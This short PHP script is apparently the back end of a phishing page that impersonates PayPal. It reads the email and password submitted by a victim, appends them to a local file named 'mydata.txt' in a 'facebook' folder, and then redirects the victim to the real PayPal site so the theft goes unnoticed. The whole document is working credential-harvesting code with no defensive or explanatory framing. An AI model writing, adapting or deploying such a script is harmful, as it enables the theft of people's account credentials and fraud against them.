<?php

file_put_contents("../facebook/mydata.txt", "PAYPAL Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/');
exit();
                                                                  
